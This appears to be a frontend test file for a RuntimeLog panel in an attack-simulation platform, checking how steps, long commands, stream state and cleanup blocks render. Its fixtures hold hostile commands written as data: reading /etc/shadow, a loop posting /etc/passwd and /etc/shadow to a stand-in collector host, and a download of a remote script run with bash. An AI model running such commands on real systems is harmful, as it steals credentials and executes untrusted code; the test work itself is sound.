/**
 * RuntimeLog — the one panel on a run's page. One block per step: state as a
 * StatusIcon and a word, the command (one line, opened in place when long),
 * the host's exit and duration, then the output.
 */
import React from 'react'
import { describe, it, expect } from 'vitest'
import { render, screen, within } from '@testing-library/react'
import RuntimeLog from '../RuntimeLog.jsx'
import { buildRuntimeLog } from '../runtimeLog.js'

void React

const LONG = [
  'for f in /etc/passwd /etc/shadow /etc/group; do',
  '  curl -fsS -X POST --data-binary @"$f" "https://collector.example.test/ingest?name=$(basename "$f")"',
  'done',
].join('\n')

const STEPS = [
  { id: 'step-01', name: 'Read the shadow file', command: 'cat /etc/shadow', identity: 'root', mitre_technique: 'T1003.008' },
  { id: 'step-02', name: 'Exfiltrate', command: LONG, identity: 'www-data', mitre_technique: 'T1041' },
]
const OUTPUT = [
  '=== STEP 1/2 · step-01 · T1003.008 · identity=root ===',
  'root:$6$abc:19000:0:99999:7:::',
  '--- exit_code=0 duration=1.2s ---',
  '=== STEP 2/2 · step-02 · T1041 · identity=www-data ===',
  '--- exit_code=0 duration=4s ---',
].join('\n')

const log = (run, steps = STEPS) => buildRuntimeLog({ steps, run })
const steps = () => screen.getAllByTestId('runtime-step')

describe('<RuntimeLog />', () => {
  it('draws a block per step with its state, account, exit and duration', () => {
    render(<RuntimeLog log={log({ status: 'complete', output: OUTPUT })} />)
    const [one, two] = steps()
    expect(within(one).getByRole('img', { name: 'Ran' })).toBeInTheDocument()
    expect(one).toHaveTextContent('01')
    expect(one).toHaveTextContent('Read the shadow file')
    expect(one).toHaveTextContent('as root')
    expect(one).toHaveTextContent('exit 0 · 1.2s')
    expect(within(one).getByTestId('runtime-step-command')).toHaveTextContent('as authored')
    // A step that ran and printed nothing says so, rather than showing a blank.
    expect(within(two).queryByTestId('runtime-step-output')).toBeNull()
    expect(two).toHaveTextContent('No output')
  })

  it('a short command is shown whole; a long one shows one line and opens in place', () => {
    render(<RuntimeLog log={log({ status: 'complete', output: OUTPUT })} />)
    const [one, two] = steps()
    expect(within(one).getByTestId('runtime-step-command').querySelector('details')).toBeNull()

    const more = within(two).getByTestId('runtime-step-command').querySelector('details')
    expect(more).not.toBeNull()
    expect(more.open).toBe(false)
    expect(more.querySelector('summary')).toHaveTextContent('for f in /etc/passwd /etc/shadow /etc/group; do')
    expect(more.querySelector('summary')).not.toHaveTextContent('curl -fsS')
    const full = more.querySelector('pre')
    expect(full.textContent).toBe(LONG)
    expect(full).not.toBeVisible()
    more.open = true
    expect(full).toBeVisible()
  })

  it("says when the command is the agent's own record of it", () => {
    const run = { status: 'complete', output: OUTPUT, step_starts: [{ step_id: 'step-01', command: 'cat /etc/shadow' }] }
    render(<RuntimeLog log={log(run)} />)
    expect(within(steps()[0]).getByTestId('runtime-step-command')).toHaveTextContent('from the agent')
  })

  it('a finished run reads Stored; a live one shows how it is being followed', () => {
    const { rerender } = render(<RuntimeLog log={log({ status: 'complete', output: OUTPUT })} />)
    const bar = () => screen.getByRole('region', { name: 'Runtime log' }).querySelector('.rtlog__bar')
    expect(within(bar()).getByRole('img', { name: 'Stored' })).toBeInTheDocument()
    rerender(<RuntimeLog log={log({ status: 'running', output: '' })} stream={{ connected: true, mode: 'stream' }} />)
    expect(within(bar()).getByRole('img', { name: 'Live' })).toBeInTheDocument()
    rerender(<RuntimeLog log={log({ status: 'running', output: '' })} stream={{ connected: true, mode: 'poll' }} />)
    expect(within(bar()).getByRole('img', { name: 'Polling' })).toBeInTheDocument()
    rerender(<RuntimeLog log={log({ status: 'complete', output: OUTPUT })} partial />)
    expect(within(bar()).getByRole('img', { name: 'Stored · last 2 KB' })).toBeInTheDocument()
  })

  it('claims nothing about a step until the run record is read', () => {
    const { rerender } = render(<RuntimeLog log={log(null)} loaded={false} />)
    expect(screen.getByTestId('runtime-log-empty')).toHaveTextContent('Loading…')
    expect(screen.queryAllByTestId('runtime-step')).toHaveLength(0)
    rerender(<RuntimeLog log={log(null)} loaded={false} failed />)
    expect(screen.getByTestId('runtime-log-empty')).toHaveTextContent('Run record not loaded')
  })

  it('a run with no steps and no output says so in one line', () => {
    render(<RuntimeLog log={log({ status: 'failed', output: '' }, [])} />)
    expect(screen.getByTestId('runtime-log-empty')).toHaveTextContent('No steps recorded')
  })

  it('keeps the lines the transcript carries outside any step, in place', () => {
    const run = { status: 'aborted', output: `!! PLATFORM VARIANT: step=step-02 ran its windows variant\n${OUTPUT}\n--- ABORTED (operator) ---` }
    render(<RuntimeLog log={log(run)} />)
    const items = [...screen.getByRole('region', { name: 'Runtime log' }).querySelectorAll('.rtlog__steps > li')]
    expect(items.map((li) => li.getAttribute('data-testid'))).toEqual(
      ['runtime-note', 'runtime-step', 'runtime-step', 'runtime-note'],
    )
    expect(items[0]).toHaveTextContent('PLATFORM VARIANT')
    expect(items[3]).toHaveTextContent('ABORTED (operator)')
  })
})

describe('<RuntimeLog /> — a command preview leads with what the step does', () => {
  const PRE = `C=$(mktemp -d /tmp/cortexsim.XXXXXX) || exit 1; trap 'rm -rf "$C"' EXIT`
  const COMMAND = `${PRE}\ncurl -sS https://example.test/a.sh -o "$C/a.sh"\nbash "$C/a.sh"`

  it('skips the scratch-folder line in the preview, and Show all still shows every line', () => {
    const run = { status: 'complete', output: OUTPUT }
    render(<RuntimeLog log={log(run, [{ ...STEPS[0], command: COMMAND }, STEPS[1]])} />)
    const more = within(steps()[0]).getByTestId('runtime-step-command').querySelector('details')
    expect(more).not.toBeNull()
    expect(more.querySelector('summary code')).toHaveTextContent('curl -sS https://example.test/a.sh -o "$C/a.sh"')
    expect(more.querySelector('summary')).not.toHaveTextContent('mktemp')
    expect(more.querySelector('summary')).toHaveTextContent('Show all')
    expect(more.querySelector('pre').textContent).toBe(COMMAND)
  })
})

describe('<RuntimeLog /> — cleanup is its own block, after the steps', () => {
  const CLEANUP = [
    '=== CLEANUP · 3 commands · identity=direct ===',
    '$ rm -rf /tmp/cortexsim-edr001',
    '--- cleanup 1/3 exit_code=0 duration=4ms ---',
    '$ systemctl disable --now cortexsim-demo.service',
    'Failed to disable unit: Unit file cortexsim-demo.service does not exist.',
    '--- cleanup 2/3 exit_code=1 duration=12ms ---',
    '$ userdel svc-demo',
    '--- cleanup 3/3 exit_code=0 duration=9ms ---',
  ].join('\n')
  const entry = (over) => [{ agent_id: 'ag-1', task_id: 't-1', commands: 3, status: 'clean', ran: 3, failed: 0, reason: null, ...over }]
  const cleanup = () => screen.getByTestId('runtime-cleanup')

  it('says Cleanup, a state as a StatusIcon and a word, and keeps the commands behind one line', () => {
    const run = { status: 'complete', output: `${OUTPUT}\n${CLEANUP}`, cleanup: entry({ status: 'failed', failed: 1, reason: 'COMMAND_FAILED' }) }
    render(<RuntimeLog log={log(run)} />)
    // After the steps, and not inside the last one.
    const region = screen.getByRole('region', { name: 'Runtime log' })
    expect(region.querySelectorAll('[data-testid="runtime-step"] [data-testid="runtime-cleanup"]')).toHaveLength(0)
    expect(steps()[1].compareDocumentPosition(cleanup()) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
    expect(steps()[1]).not.toHaveTextContent('userdel')

    expect(cleanup()).toHaveTextContent('Cleanup')
    expect(within(cleanup()).getByRole('img', { name: '1 of 3 failed' })).toBeInTheDocument()
    const more = cleanup().querySelector('details')
    expect(more.open).toBe(false)
    expect(more.querySelector('summary code')).toHaveTextContent('rm -rf /tmp/cortexsim-edr001')
    expect(more.querySelector('summary')).toHaveTextContent('Show all')
    const full = more.querySelector('.rtlog__cleanup-cmds')
    expect(full).not.toBeVisible()
    more.open = true
    expect(full).toBeVisible()
    expect(full).toHaveTextContent('systemctl disable --now cortexsim-demo.service')
    expect(full).toHaveTextContent('Failed to disable unit')
    expect(full).toHaveTextContent('exit 1 · 12ms')
  })

  it.each([
    ['clean', {}, 'Clean'],
    ['not_run', { status: 'not_run', ran: 0, reason: 'NO_STEP_STARTED' }, 'Not run'],
  ])('a %s cleanup reads its one word', (_key, over, word) => {
    const run = { status: 'complete', output: OUTPUT, cleanup: entry(over) }
    render(<RuntimeLog log={log(run)} />)
    expect(within(cleanup()).getByRole('img', { name: word })).toBeInTheDocument()
  })

  it('a live run whose cleanup has not run reads Pending', () => {
    const run = { status: 'running', output: OUTPUT.split('\n').slice(0, 3).join('\n'), cleanup: entry({ status: 'pending', ran: 0 }) }
    render(<RuntimeLog log={log(run)} stream={{ connected: true, mode: 'stream' }} />)
    expect(within(cleanup()).getByRole('img', { name: 'Pending' })).toBeInTheDocument()
  })

  it('renders the reason the host reported as text', () => {
    const run = { status: 'complete', output: `${OUTPUT}\n${CLEANUP}`, cleanup: entry({ status: 'failed', failed: 1, reason: '<b>disk full</b>' }) }
    render(<RuntimeLog log={log(run)} />)
    expect(cleanup()).toHaveTextContent('<b>disk full</b>')
    expect(cleanup().querySelector('b')).toBeNull()
  })

  it('a run with no cleanup shows no cleanup block', () => {
    render(<RuntimeLog log={log({ status: 'complete', output: OUTPUT })} />)
    expect(screen.queryByTestId('runtime-cleanup')).toBeNull()
  })
})
